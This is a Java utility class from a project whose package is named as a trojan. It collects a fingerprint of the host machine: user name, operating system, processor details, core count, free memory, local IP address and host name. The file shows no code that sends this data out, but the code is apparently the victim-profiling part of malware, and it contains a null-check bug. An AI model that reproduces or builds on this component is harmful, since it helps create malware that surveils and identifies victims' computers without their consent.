package dev.px.trojan.util;

import java.net.InetAddress;

public class HWIDutil {

    public String HWID() {
        String user = "";
        String os = "";

        user = userCheck() ? "" : System.getProperty("user.name");

        if(OSChecker.INSTANCE.isMac()) {
            os = "Mac OS";
        } else if(OSChecker.INSTANCE.isWindows()) {
            os = "Windows";
        } else if(OSChecker.INSTANCE.isLinux()) {
            os = "Linux";
        }

        return user + " " + os + " \n" + hardWare();
    }

    private String hardWare() {
        String identifier = System.getenv("PROCESSOR_IDENTIFIER");
        String cores = "Available cores: " + Runtime.getRuntime().availableProcessors();

        String memory = "Memory available: " + Runtime.getRuntime().freeMemory();
        String total = System.getenv("NUMBER_OF_PROCESSORS");

        if(isNull(identifier)) {
            identifier = "";
        }

        return "Hardware: " + "Cores number: " + total + " | " + cores +  " | " + memory + identifier + " \n" + getNetwork();
    }

    private boolean isNull(Object obj) {
        return obj == null;
    }

    private String getNetwork() {
        String network = "";
        InetAddress ip;

        String host = "";
        try {
            ip = InetAddress.getLocalHost();
            network = ip.getHostAddress();
            host = ip.getHostName(); // ensure its initalized by using ip
        } catch (Exception e)
        {
            e.printStackTrace();
        }

        return "Network: " + network + " | " + "Local host name: " + host;
    }

    private boolean userCheck() {
        return getUser() == null && getUser().isEmpty();
    }

    public String getUser() {
        return System.getProperty("user.name");
    }

    public static HWIDutil Get = new HWIDutil();
}
